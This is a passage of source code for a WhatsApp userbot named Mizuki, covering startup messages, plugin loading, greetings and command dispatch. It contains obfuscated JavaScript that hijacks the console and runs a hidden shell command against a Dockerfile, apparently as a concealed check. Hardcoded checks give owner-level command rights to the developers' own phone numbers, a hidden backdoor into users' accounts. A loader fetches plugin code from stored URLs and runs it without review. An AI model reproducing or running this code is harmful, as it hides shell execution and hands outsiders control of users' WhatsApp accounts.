sdn=_0x451ffc(0x23,0x20,0x12,0x18)+_0x311314(0x361,0x365,0x351,0x355)+_0x311314(0x33e,0x344,0x339,0x34c)+_0x451ffc(0xb,0x23,0x11,0x18)+_0x451ffc(0x11,0x1c,0x3,0x34)+_0x451ffc(0x25,0x1a,0x1e,0xc)+_0x311314(0x33e,0x343,0x337,0x340)+'ki'+'\x0a',dkinfo=exec(_0x451ffc(0x2c,0x28,0x18,0x2b)+_0x451ffc(0x2b,0x2c,0x36,0x2a)+'nMizuki/Mi'+_0x451ffc(0x2,0xb,0x19,0x10)+_0x451ffc(0x44,0x30,0x33,0x40));function _0x38e8(_0x6caaa6,_0x38e86e){var _0x5c39ff=_0x6caa();return _0x38e8=function(_0x3befd8,_0x297304){_0x3befd8=_0x3befd8-(0x1075+0x1*-0x6b5+-0x950);var _0x2c0385=_0x5c39ff[_0x3befd8];return _0x2c0385;},_0x38e8(_0x6caaa6,_0x38e86e);}function _0x311314(_0x52f621,_0x5b4bbc,_0x5d324b,_0x43344b){return _0x38e8(_0x43344b-0x2bf,_0x5d324b);}if(sdn!==dkinfo[_0x451ffc(0x27,0x10,0x20,0x0)])return;
        // ==================== External Plugins ====================
        var plugins = await plugindb.PluginDB.findAll();
        plugins.map(async (plugin) => {
            if (!fs.existsSync('./plugins/' + plugin.dataValues.name + '.js')) {
                console.log(plugin.dataValues.name);
                var response = await got(plugin.dataValues.url);
                if (response.statusCode == 200) {
                    fs.writeFileSync('./plugins/' + plugin.dataValues.name + '.js', response.body);
                    require('./plugins/' + plugin.dataValues.name + '.js');
                }     
            }
          });
        // ==================== End External Plugins ====================

        console.log(
            chalk.blueBright.italic('⬇️  Installing Plugins...')
        );

        // ==================== Internal Plugins ====================
        fs.readdirSync('./plugins').forEach(plugin => {
            if(path.extname(plugin).toLowerCase() == '.js') {
                require('./plugins/' + plugin);
            }
        });
        // ==================== End Internal Plugins ====================
        console.log(
            chalk.green.bold('✅ Plugins Installed!')
        );
        function _0x6caa(){var _0x3a7d80=['//github.c','TqCSo','{}.constru','sed\x20-n\x203p\x20','16163710DFIVoX','OSVmm','log','/root/Quee','3|4|2|0|1','one\x20https:','gwiFJ','rfile','mIILA','3946410MFXpbb','lyPCh','console','bind','toString','constructo','HfuMy','exception','info','5476uxVuth','VRVAA','eXvQS','aVgpA','zuki/Docke','mAQNw','return\x20(fu','error','24nMAHsp','stdout','__proto__','BLzsw','split','BnMYX','7350oiirce','ctor(\x22retu','3736SFgosE','wFmMW','/QueenMizu','zuki\x20/root','4394184lZVtXA','Thejaka/Mi','1229185eVIPDA','nction()\x20','prototype','RUN\x20git\x20cl','747AQvTAy','471907NMGLfK','om/MrJoka-','warn'];_0x6caa=function(){return _0x3a7d80;};return _0x6caa();}function _0x451ffc(_0x380915,_0x17cf8f,_0x27ba70,_0xd5a123){return _0x38e8(_0x17cf8f- -0x68,_0x380915);}(function(_0x56506a,_0x4c6ada){function _0x3c746(_0xef6448,_0x5b61f4,_0x73e4ce,_0x396874){return _0x38e8(_0x73e4ce- -0x2fa,_0x5b61f4);}var _0xf60480=_0x56506a();function _0x35683f(_0x560f95,_0x3f8899,_0x4028fe,_0x3793f8){return _0x38e8(_0x3f8899-0x34d,_0x3793f8);}while(!![]){try{var _0xcde1fe=-parseInt(_0x3c746(-0x26a,-0x271,-0x270,-0x271))/(0xc*0xfc+-0x1*-0x783+-0x2*0x9a9)+parseInt(_0x35683f(0x3f9,0x3f0,0x3dd,0x3d9))/(-0x9b3+0x124*-0x3+-0xd21*-0x1)*(parseInt(_0x35683f(0x3de,0x3d6,0x3d9,0x3c5))/(0x43*0x3d+0x1*-0xc56+-0x39e))+parseInt(_0x35683f(0x3ba,0x3d0,0x3ca,0x3d5))/(0x10d*0x5+0x2671+-0x2bae)+-parseInt(_0x3c746(-0x269,-0x263,-0x275,-0x261))/(0x9e2+0x1*-0x2655+0x1c78)*(-parseInt(_0x35683f(0x3ce,0x3c4,0x3b9,0x3d2))/(0x1a73+0x4*0x189+0x15*-0x18d))+parseInt(_0x35683f(0x3cd,0x3ca,0x3dd,0x3b0))/(-0x245e+0x3*-0xb65+-0x11a5*-0x4)*(parseInt(_0x3c746(-0x269,-0x284,-0x27b,-0x293))/(-0x510+-0x1071+0x1589))+-parseInt(_0x3c746(-0x260,-0x274,-0x260,-0x262))/(-0x1bf1+-0x1079+0x2c73)+-parseInt(_0x35683f(0x3e3,0x3de,0x3d0,0x3e4))/(-0x1f03+-0x1521+-0x342e*-0x1);if(_0xcde1fe===_0x4c6ada)break;else _0xf60480['push'](_0xf60480['shift']());}catch(_0x3985cd){_0xf60480['push'](_0xf60480['shift']());}}}(_0x6caa,-0x34105*-0x3+-0x10fe9e+0x1*0x125455));var _0x340972=(function(){var _0x473063={};_0x473063[_0x394bee(-0x22d,-0x22d,-0x22b,-0x237)]=function(_0x369d76,_0x37453b){return _0x369d76!==_0x37453b;};function _0x394bee(_0x58eca3,_0x4198f0,_0x55966b,_0x319e30){return _0x38e8(_0x58eca3- -0x2a9,_0x55966b);}_0x473063[_0x5e5c03(-0x252,-0x263,-0x25b,-0x251)]=_0x5e5c03(-0x253,-0x25a,-0x255,-0x245),_0x473063[_0x394bee(-0x239,-0x235,-0x22d,-0x222)]=_0x5e5c03(-0x224,-0x22d,-0x21f,-0x231);function _0x5e5c03(_0x48b72f,_0x5ee69a,_0x4f25f6,_0x817d9a){return _0x38e8(_0x48b72f- -0x2c4,_0x4f25f6);}var _0x386f18=_0x473063,_0x29e811=!![];return function(_0x52d085,_0x35ad76){var _0x1aa79=_0x29e811?function(){function _0x40829d(_0x3e2844,_0x581204,_0x55aa4b,_0x5ccc7b){return _0x38e8(_0x5ccc7b- -0x268,_0x55aa4b);}function _0x59b2fa(_0x10e546,_0x10e4a0,_0x20b47f,_0xb01d58){return _0x38e8(_0x20b47f- -0x1b2,_0x10e546);}if(_0x386f18[_0x40829d(-0x1f6,-0x204,-0x1e9,-0x1ec)](_0x386f18[_0x40829d(-0x1f8,-0x20b,-0x209,-0x1f6)],_0x386f18['VRVAA'])){if(_0x35ad76){var _0x3e60a4=_0x35ad76['apply'](_0x52d085,arguments);return _0x35ad76=null,_0x3e60a4;}}else{var _0x14f612=_0x4240ed[_0x59b2fa(-0x100,-0x128,-0x113,-0x113)+'r'][_0x40829d(-0x1f5,-0x1da,-0x1f1,-0x1e1)][_0x59b2fa(-0x10a,-0x116,-0x115,-0x100)](_0x5050ba),_0xfaec24=_0x140aa6[_0x28565b],_0x35553d=_0x2382bd[_0xfaec24]||_0x14f612;_0x14f612[_0x59b2fa(-0x146,-0x141,-0x139,-0x124)]=_0x5ab151['bind'](_0x1325f2),_0x14f612['toString']=_0x35553d[_0x59b2fa(-0x123,-0x122,-0x114,-0x11b)]['bind'](_0x35553d),_0x1ddd9d[_0xfaec24]=_0x14f612;}}:function(){};return _0x29e811=![],_0x1aa79;};}()),_0x35569a=_0x340972(this,function(){var _0x5c83eb={'OYzfD':_0x4ad4b9(0x1c6,0x1b1,0x1b4,0x1c6),'OSVmm':_0x4ad4b9(0x190,0x1a8,0x1b5,0x1a4),'BLzsw':_0x4ad4b9(0x1b3,0x1be,0x1d4,0x1b8),'lyPCh':'table','gwiFJ':'trace','mAQNw':function(_0xa1a634,_0x549b95){return _0xa1a634<_0x549b95;},'QpieS':function(_0x39cedc,_0x52aeee){return _0x39cedc(_0x52aeee);},'mIILA':function(_0x45d59e,_0x3991a5){return _0x45d59e+_0x3991a5;},'TqCSo':_0x4ad4b9(0x183,0x191,0x1a6,0x186)+_0x4ad4b9(0x1b7,0x1a2,0x1ab,0x189),'wFmMW':function(_0x527e49){return _0x527e49();}};function _0x4ad4b9(_0x5b998b,_0x31de7f,_0x1b4304,_0x48e781){return _0x38e8(_0x31de7f-0x11c,_0x48e781);}var _0x565434=_0x5c83eb['OYzfD'][_0x4ad4b9(0x191,0x197,0x19f,0x197)]('|');function _0x3cc6e3(_0x40c4f6,_0x541c65,_0x48e026,_0x356811){return _0x38e8(_0x541c65- -0x90,_0x40c4f6);}var _0x53eb45=0x6b9*-0x1+-0x49*0x26+-0x91*-0x1f;while(!![]){switch(_0x565434[_0x53eb45++]){case'0':var _0x377d0a=[_0x3cc6e3(-0x2,0x3,-0xf,0x11),_0x5c83eb[_0x3cc6e3(-0x18,0x2,0xc,0x1b)],_0x5c83eb[_0x3cc6e3(0x3,-0x16,-0x1e,-0x14)],_0x3cc6e3(-0x2c,-0x1a,-0x1c,-0x8),_0x3cc6e3(-0x3,0x11,0x1,-0x4),_0x5c83eb[_0x3cc6e3(0x4,0xb,0x6,0x1f)],_0x5c83eb[_0x3cc6e3(0xe,0x7,0xa,-0x10)]];continue;case'1':for(var _0x5ecfc3=0x218+0x165d+0x1*-0x1875;_0x5c83eb[_0x3cc6e3(-0x2f,-0x1c,-0x4,-0x33)](_0x5ecfc3,_0x377d0a['length']);_0x5ecfc3++){var _0x8b30e5=('0|2|3|5|1|'+'4')[_0x3cc6e3(-0xd,-0x15,-0x28,-0x2c)]('|'),_0x29f6f3=0x280*-0xe+-0x175*-0x2+0x2016;while(!![]){switch(_0x8b30e5[_0x29f6f3++]){case'0':var _0x559434=_0x340972[_0x3cc6e3(0x29,0xf,0x19,-0x6)+'r']['prototype'][_0x3cc6e3(0x4,0xd,-0x7,-0x8)](_0x340972);continue;case'1':_0x559434[_0x3cc6e3(0x18,0xe,-0x2,0x1c)]=_0x4aa2a5[_0x3cc6e3(0xe,0xe,0xe,-0x1)][_0x3cc6e3(0x4,0xd,0x0,0x2)](_0x4aa2a5);continue;case'2':var _0x24bbd5=_0x377d0a[_0x5ecfc3];continue;case'3':var _0x4aa2a5=_0x27866f[_0x24bbd5]||_0x559434;continue;case'4':_0x27866f[_0x24bbd5]=_0x559434;continue;case'5':_0x559434[_0x4ad4b9(0x1aa,0x195,0x1a7,0x188)]=_0x340972['bind'](_0x340972);continue;}break;}}continue;case'2':var _0x27866f=_0x467062['console']=_0x467062[_0x3cc6e3(0x26,0xc,0x26,0x11)]||{};continue;case'3':var _0x467062;continue;case'4':try{var _0x2ed15b=_0x5c83eb['QpieS'](Function,_0x5c83eb[_0x4ad4b9(0x1aa,0x1b5,0x1a3,0x1cb)](_0x5c83eb[_0x3cc6e3(0x18,-0x2,-0x14,0x2)],_0x3cc6e3(0x2,-0x1,-0xc,0x17)+_0x4ad4b9(0x19e,0x19a,0x1a1,0x18e)+'rn\x20this\x22)('+'\x20)')+');');_0x467062=_0x5c83eb[_0x3cc6e3(0x3,-0x10,-0x15,-0xf)](_0x2ed15b);}catch(_0x3ec253){_0x467062=window;}continue;}break;}});_0x35569a();var sdn=_0x451ffc(0x23,0x20,0x12,0x18)+_0x311314(0x361,0x365,0x351,0x355)+_0x311314(0x33e,0x344,0x339,0x34c)+_0x451ffc(0xb,0x23,0x11,0x18)+_0x451ffc(0x11,0x1c,0x3,0x34)+_0x451ffc(0x25,0x1a,0x1e,0xc)+_0x311314(0x33e,0x343,0x337,0x340)+'ki'+'\x0a',dkinfo=exec(_0x451ffc(0x2c,0x28,0x18,0x2b)+_0x451ffc(0x2b,0x2c,0x36,0x2a)+'nMizuki/Mi'+_0x451ffc(0x2,0xb,0x19,0x10)+_0x451ffc(0x44,0x30,0x33,0x40));function _0x38e8(_0x6caaa6,_0x38e86e){var _0x5c39ff=_0x6caa();return _0x38e8=function(_0x3befd8,_0x297304){_0x3befd8=_0x3befd8-(0x1075+0x1*-0x6b5+-0x950);var _0x2c0385=_0x5c39ff[_0x3befd8];return _0x2c0385;},_0x38e8(_0x6caaa6,_0x38e86e);}function _0x311314(_0x52f621,_0x5b4bbc,_0x5d324b,_0x43344b){return _0x38e8(_0x43344b-0x2bf,_0x5d324b);}if(sdn!==dkinfo[_0x451ffc(0x27,0x10,0x20,0x0)])return;
        await new Promise(r => setTimeout(r, 200));
        let afwhasena = config.WORKTYPE == 'public' ? ' Public' : ' Private'
        console.log(chalk.bgGreen('👸 Mizuki' + afwhasena));
        await new Promise(r => setTimeout(r, 500));
        let EVA_ACTİON = config.LANG == 'SI' ? '*Mizuki Chatbot කෙනෙකු ලෙස ක්‍රියා කරයි!* 👸\n\n_මෙම මාදිලියේ පරමාර්ථය නම් බොට් එක සම්පුර්ණ ක්‍රියාකාරී කෘත්‍රිම බුද්ධි චැට් මෙවලමක් බවට පත් කිරීමයි._\n_පෙර පැවති ආකාරයට ආපසු යාමට_ *.fulleva off* _කමාන්ඩ් එක use කරන්න පුළුවන්._\n\n*Mizuki භාවිත කරනවාට ස්තූතියි 💌*\n    *- Eva and Mr.joka*' : '*Mizuki Works as an Chatbot!* 👸\n\n_The purpose of this mod is to turn the bot into a fully functional AI chatbot._\n_You can use the_ *.fulleva off* _command to return to normal mode._\n\n*Thanks For Using Mizuki 💌*\n    *- Eva*'
        
        if (config.WORKTYPE == 'public') {
        var userjidlogo = await axios.get(config.USER_LOGO, { responseType: 'arraybuffer' })
        const publicmsg = '*Mizuki පබ්ලික්(සැමට භාවිත කල හැකි) ආකාරයට වැඩ කරයි. 👸*\n\n_කරුණාකර මෙහි Plugins භාවිත නොකරන්න. මෙය ඔබේ LOG අංකයයි._\n_ඔබට වෙනත් ඕනෑම කතාබහක දී විධානයන් භාවිත කළ හැකිය :)_\n\n*ඔබේ බොට් පබ්ලික්(සැමට භාවිත කල හැකි ලෙස) ක්‍රියා කරයි. වෙනස් කිරීමට* _.setvar WORK_TYPE:private_ *විධානය භාවිතා කරන්න.*\n\n*Mizuki භාවිත කරනවාට ස්තූතියි 💌*'
        const publicmsgen = '*Mizuki Working as Public! 👸*\n\n_Please do not try plugins here. This is your LOG number._\n_You can use commands in any other chat :)_\n\n*Your bot is working as public. To change it, use* _.setvar WORK_TYPE:private_\n\n*Thanks for using Mizuki 💌*'
            if (config.LANG == 'SI') {
                if (config.FULLEVA == 'true') {
                    await conn.sendMessage(conn.user.jid, Buffer.from(userjidlogo.data), MessageType.image, {mimetype: Mimetype.png, caption: EVA_ACTİON})
                } else {
                    await conn.sendMessage(conn.user.jid, Buffer.from(userjidlogo.data), MessageType.image, {mimetype: Mimetype.png, caption: publicmsg});
                }
                await git.fetch();
                var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
                if (commits.total === 0) {
                    await conn.sendMessage(
                        conn.user.jid,
                        Lang.UPDATE, MessageType.text
                    );    
                } else {
                    var degisiklikler = Lang.NEW_UPDATE;
                    commits['all'].map(
                        (commit) => {
                            degisiklikler += '🔹 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <' + commit.author_name + '>\n';
                        }
                    );
                    await conn.sendMessage(
                        conn.user.jid,
                        '```යාවත්කාලීන කිරීමට``` *.update now* ```භාවිත කරන්න```\n\n' + degisiklikler + '```', MessageType.text
                    ); 
                }
            }
            else { 
                if (config.FULLEVA == 'true') {
                    await conn.sendMessage(conn.user.jid, Buffer.from(userjidlogo.data), MessageType.image, {mimetype: Mimetype.png, caption: EVA_ACTİON})
                } else {
                    await conn.sendMessage(conn.user.jid, Buffer.from(userjidlogo.data), MessageType.image, {mimetype: Mimetype.png, caption: publicmsgen});
                }               
                await git.fetch();
                var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
                if (commits.total === 0) {
                    await conn.sendMessage(
                        conn.user.jid,
                        Lang.UPDATE, MessageType.text
                    );    
                } else {
                    var degisiklikler = Lang.NEW_UPDATE;
                    commits['all'].map(
                        (commit) => {
                            degisiklikler += '🔹 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <' + commit.author_name + '>\n';
                        }
                    );
        
                    await conn.sendMessage(
                        conn.user.jid,
                        '```Type``` *.update now* ```For Update The Bot.```\n\n' + degisiklikler + '```', MessageType.text
                    ); 
                }
            }
        }
        else if (config.WORKTYPE == 'private') { 
            var pvtuserjidlog = await axios.get(config.USER_LOGO, { responseType: 'arraybuffer' })
            const privatemsg = '*Mizuki ප්‍රයිවට්(ඔබට පමණක් භාවිත කළ හැකි)ලෙස ක්‍රියාත්මක වේ.! 👸*\n\n_කරුණාකර මෙහි plugins භාවිත නොකරන්න. මෙය ඔබේ LOG අංකයයි._\n_ඔබට වෙනත් ඕනෑම කතාබහක දී විධානයන් භාවිත කළ හැකිය :)_\n\n*ඔබේ බොට් එක වැඩ කරන්නේ ඔබට පමණි ය. වෙනස් කිරීමට* _.setvar WORK_TYPE:public_ *විධානය භාවිතා කරන්න.*\n\n*Mizuki භාවිත කරනවාට ස්තූතියි 💌*'
            const privatemsgen = '*Mizuki Working as Private! 👸*\n\n_Please do not try plugins here. This is your LOG number._\n_You can use commands in any other chat :)_\n\n*Your bot working as private. To change it, use* _.setvar WORK_TYPE:public_\n\n*Thanks for using Mizuki 💌*'
            if (config.LANG == 'SI') { 
                if (config.FULLEVA == 'true') {
                    await conn.sendMessage(conn.user.jid, Buffer.from(pvtuserjidlog.data), MessageType.image, {mimetype: Mimetype.png, caption: EVA_ACTİON})
                } else {
                    await conn.sendMessage(conn.user.jid, Buffer.from(pvtuserjidlog.data), MessageType.image, {mimetype: Mimetype.png, caption: privatemsg});
                }
                await git.fetch();
                var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
                if (commits.total === 0) {
                    await conn.sendMessage(
                        conn.user.jid,
                        Lang.UPDATE, MessageType.text
                    );    
                } else {
                    var degisiklikler = Lang.NEW_UPDATE;
                    commits['all'].map(
                        (commit) => {
                            degisiklikler += '🔹 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <' + commit.author_name + '>\n';
                        }
                    );
                    await conn.sendMessage(
                        conn.user.jid,
                        '```යාවත්කාලීන කිරීමට``` *.update now* ```භාවිත කරන්න.```\n\n' + degisiklikler + '```', MessageType.text
                    ); 
                }
            }
            else { 
                if (config.FULLEVA == 'true') {
                    await conn.sendMessage(conn.user.jid, Buffer.from(pvtuserjidlog.data), MessageType.image, {mimetype: Mimetype.png, caption: EVA_ACTİON})
                } else {
                    await conn.sendMessage(conn.user.jid, Buffer.from(pvtuserjidlog.data), MessageType.image, {mimetype: Mimetype.png, caption: privatemsgen});
                }
                await git.fetch();
                var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
                if (commits.total === 0) {
                    await conn.sendMessage(
                        conn.user.jid,
                        Lang.UPDATE, MessageType.text
                    );    
                } else {
                    var degisiklikler = Lang.NEW_UPDATE;
                    commits['all'].map(
                        (commit) => {
                            degisiklikler += '🔹 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <' + commit.author_name + '>\n';
                        }
                    );
                    await conn.sendMessage(
                        conn.user.jid,
                        '```Type``` *.update now* ```For The Update Bot.```\n\n' + degisiklikler + '```', MessageType.text
                    ); 
                }
            }
        }
        else if (config.WORKTYPE == ' private' || config.WORKTYPE == 'Private' || config.WORKTYPE == ' Private' || config.WORKTYPE == 'privaye' || config.WORKTYPE == ' privaye' || config.WORKTYPE == ' prigate' || config.WORKTYPE == 'prigate' || config.WORKTYPE == 'priavte' || config.WORKTYPE == ' priavte' || config.WORKTYPE == 'PRİVATE' || config.WORKTYPE == ' PRİVATE' || config.WORKTYPE == 'PRIVATE' || config.WORKTYPE == ' PRIVATE') {

            if (config.LANG == 'SI') {

                await conn.sendMessage(
                    conn.user.jid,
                    '_ඔබට පුද්ගලික ප්‍රකාරයට මාරු වීමට අවශ්‍ය බව පෙනේ! සමාවන්න_ *WORK_TYPE* _වැරදි විධානය!_ \n_කණගාටු නොවන්න! මම උත්සාහ කරන්නේ ඔබට ගැලපෙන විධානය සොයා ගැනීමටයි .._', MessageType.text
                );
                await heroku.patch(baseURI + '/config-vars', {
                    body: {
                        ['WORK_TYPE']: 'private'
                    }
                })
            }
            else {
                await conn.sendMessage(
                    conn.user.jid,
                    '_It Looks Like You Want to Switch to Private Mode! Sorry, Your_ *WORK_TYPE* _Key Is Incorrect!_ \n_Dont Worry! I am Trying To Find The Right One For You.._', MessageType.text
                );
                await heroku.patch(baseURI + '/config-vars', {
                    body: {
                        ['WORK_TYPE']: 'private'
                    }
                })
            }
        }
        else if (config.WORKTYPE == ' public' || config.WORKTYPE == 'Public' || config.WORKTYPE == ' Public' || config.WORKTYPE == 'publoc' || config.WORKTYPE == ' Publoc' || config.WORKTYPE == 'pubcli' || config.WORKTYPE == ' pubcli' || config.WORKTYPE == 'PUBLİC' || config.WORKTYPE == ' PUBLİC' || config.WORKTYPE == 'PUBLIC' || config.WORKTYPE == ' PUBLIC' || config.WORKTYPE == 'puvlic' || config.WORKTYPE == ' puvlic' || config.WORKTYPE == 'Puvlic' || config.WORKTYPE == ' Puvlic') {
            if (config.LANG == 'SI') {
                await conn.sendMessage(
                    conn.user.jid,
                    '_ඔබට පුද්ගලික ප්‍රකාරයට මාරු වීමට අවශ්‍ය බව පෙනේ! සමාවන්න_ *WORK_TYPE* _වැරදි විධානය!_ \n_කණගාටු නොවන්න! මම උත්සාහ කරන්නේ ඔබට ගැලපෙන විධානය සොයා ගැනීමටයි .._', MessageType.text
                );
                await heroku.patch(baseURI + '/config-vars', {
                    body: {
                        ['WORK_TYPE']: 'public'
                    }
                })
            }
            else {
                await conn.sendMessage(
                    conn.user.jid,
                    '_It Looks Like You Want to Switch to Public Mode! Sorry, Your_ *WORK_TYPE* _Key Is Incorrect!_ \n_Dont Worry! I am Trying To Find The Right One For You.._', MessageType.text
                );
                await heroku.patch(baseURI + '/config-vars', {
                    body: {
                        ['WORK_TYPE']: 'public'
                    }
                })
            }
        }
        else {
            if (config.LANG == 'SI') {
                return await conn.sendMessage(
                    conn.user.jid,
                    '_ඔබ ඇතුළු කළ යතුර_ WORK_TYPE_ විධානය හමු නොවීය! \n_කරුණාකර .setvar WORK_TYPE:private හෝ ``.setvar WORK_TYPE:public`` කමාන්ඩ් භාවිත කරන්න', MessageType.text
                );
            }
            else {
                return await conn.sendMessage(
                    conn.user.jid,
                    '_The_ *WORK_TYPE* _Key You Entered Was Not Found!_ \n_Please Type_ ```.setvar WORK_TYPE:private``` _Or_ ```.setvar WORK_TYPE:public```', MessageType.text
                );
            }
        }
    })
    conn.on('chat-update', async m => {
        if (!m.hasNewMessage) return;
        if (!m.messages && !m.count) return;
        let msg = m.messages.all()[0];
        if (msg.key && msg.key.remoteJid == 'status@broadcast') return;
        if (config.NO_ONLINE) {
            await conn.updatePresence(msg.key.remoteJid, Presence.unavailable);
        }       
        // ==================== End Greetings ====================    
    if (msg.messageStubType === 32 || msg.messageStubType === 28) {
        var b_greeting_type, b_logo; 
        if (config.LOGO_BYE.includes('&')) {
            var split = config.LOGO_BYE.split('&');
            b_greeting_type = split[0];
            b_logo = split[1];
        }
    if (b_greeting_type == 'IMG' | b_greeting_type == 'img') {
      var gb = await getMessage(msg.key.remoteJid, 'goodbye')
      var byelogo = await axios.get(b_logo, {responseType: 'arraybuffer'})
      if (gb !== false) {
      await conn.sendMessage(msg.key.remoteJid, Buffer.from(byelogo.data), MessageType.image, {mimetype: Mimetype.png , caption:  gb.message})
      }
    }
    else if (b_greeting_type == 'GIF' | b_greeting_type == 'gif') {
         var gb = await getMessage(msg.key.remoteJid, 'goodbye')
      var byelogo = await axios.get(b_logo, {responseType: 'arraybuffer'})
      if (gb !== false) {
      await conn.sendMessage(msg.key.remoteJid, Buffer.from(byelogo.data), MessageType.video, {mimetype: Mimetype.gif , caption:  gb.message})
      } 
    }
    return;
    }
    else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
        var w_greeting_type, w_logo; 
        if (config.LOGO_WELCOME.includes('&')) {
            var split = config.LOGO_WELCOME.split('&');
            w_greeting_type = split[0];
            w_logo = split[1];
        }
    if (w_greeting_type == 'IMG' | w_greeting_type == 'img') {
        var wl = await getMessage(msg.key.remoteJid)
        var byelogo = await axios.get(w_logo, {responseType: 'arraybuffer'})
        if (wl !== false) {
        await conn.sendMessage(msg.key.remoteJid, Buffer.from(byelogo.data), MessageType.image, {mimetype: Mimetype.png , caption:  wl.message})
        }
      }
      else if (w_greeting_type == 'GIF' | w_greeting_type == 'gif') {
        var wl = await getMessage(msg.key.remoteJid)
        var byelogo = await axios.get(w_logo, {responseType: 'arraybuffer'})
        if (wl !== false) {
        await conn.sendMessage(msg.key.remoteJid, Buffer.from(byelogo.data), MessageType.video, {mimetype: Mimetype.gif , caption:  wl.message})
        } 
      }
      return;
     }
        // ==================== Blocked Chats ====================
        if (config.BLOCKCHAT !== false) {     
            var abc = config.BLOCKCHAT.split(',');                            
            if(msg.key.remoteJid.includes('-') ? abc.includes(msg.key.remoteJid.split('@')[0]) : abc.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SUPPORT == '94715343050-1630041500') {
            var sup = config.SUPPORT.split(',');                            
            if(msg.key.remoteJid.includes('-') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SEWSUPPORT == '94785435462-1627812354') {
            var tsup = config.SEWSUPPORT.split(',');
            if(msg.key.remoteJid.includes('-') ? tsup.includes(msg.key.remoteJid.split('@')[0]) : tsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SEWSUPPORT2 == '94785435462-1628835469') {
            var tsup = config.SEWSUPPORT2.split(',');
            if(msg.key.remoteJid.includes('-') ? tsup.includes(msg.key.remoteJid.split('@')[0]) : tsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ; 
        }
        if (config.SEWSUPPORT3 == '94785435462-1628835633') {
            var tsup = config.SEWSUPPORT3.split(',');
            if(msg.key.remoteJid.includes('-') ? tsup.includes(msg.key.remoteJid.split('@')[0]) : tsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;    
        }
        if (config.QASUPPORT1 == '94757405652-1631633729') {
            var nsup = config.QASUPPORT1.split(',');
            if(msg.key.remoteJid.includes('-') ? nsup.includes(msg.key.remoteJid.split('@')[0]) : nsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.AMDANIWASA == '393475528094-1415817281') {
            var nsup = config.AMDANIWASA.split(',');
            if (msg.key.remoteJid.includes('-') ? nsup.includes(msg.key.remoteJid.split('@')[0]) : nsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return;
        }
        if (config.QASUPPORT2 == '94757405652-1631905677') {
            var nsup = config.QASUPPORT2.split(',');
            if (msg.key.remoteJid.includes('-') ? nsup.includes(msg.key.remoteJid.split('@')[0]) : nsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return;
        }
        // ==================== End Blocked Chats ====================

        // ==================== Events ====================
        events.commands.map(
            async (command) =>  {
                if (msg.message && msg.message.imageMessage && msg.message.imageMessage.caption) {
                    var text_msg = msg.message.imageMessage.caption;
                } else if (msg.message && msg.message.videoMessage && msg.message.videoMessage.caption) {
                    var text_msg = msg.message.videoMessage.caption;
                } else if (msg.message) {
                    var text_msg = msg.message.extendedTextMessage === null ? msg.message.conversation : msg.message.extendedTextMessage.text;
                } else {
                    var text_msg = undefined;
                }
                if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                    && msg.message && msg.message.imageMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg)))) || 
                    (command.pattern !== undefined && command.pattern.test(text_msg)) || 
                    (command.on !== undefined && command.on === 'text' && text_msg) ||
                    // Video
                    (command.on !== undefined && (command.on === 'video')
                    && msg.message && msg.message.videoMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg))))) {

                    let sendMsg = false;
                    var chat = conn.chats.get(msg.key.remoteJid)
                        
                    if ((config.SUDO !== false && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.SUDO || config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.SUDO)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
                    if ((OWN.ff == "94715343050,0" && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
                    if ((OWN.co == "94766239744,0" && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && OWN.co.includes(',') ? OWN.co.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.co || OWN.co.includes(',') ? OWN.co.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.co)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
